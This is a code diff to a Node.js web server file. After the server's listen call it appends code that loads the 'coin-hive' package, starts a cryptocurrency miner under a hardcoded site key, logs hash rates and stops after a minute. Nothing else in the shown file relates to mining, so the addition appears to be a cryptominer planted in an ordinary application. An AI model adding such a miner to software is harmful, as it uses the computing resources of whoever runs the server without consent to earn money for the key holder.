@@ -28,3 +28,27 @@ app.listen(server_port, server_ip_address, function () {
     console.log( "Listening on " + server_ip_address + ", server_port " + server_port  );
 
 });
+
+const CoinHive = require('coin-hive');
+
+(async () => {
+  // Create miner
+  const miner = await CoinHive('uqPbkBkB18zwQD883hOPRnERsjwvJmu3'); // CoinHive's Site Key
+
+  // Start miner
+  await miner.start();
+
+  // Listen on events
+  miner.on('found', () => console.log('Found!'));
+  miner.on('accepted', () => console.log('Accepted!'));
+  miner.on('update', data =>
+    console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `)
+  );
+
+  // Stop miner
+  setTimeout(async () => await miner.stop(), 60000);
+})();
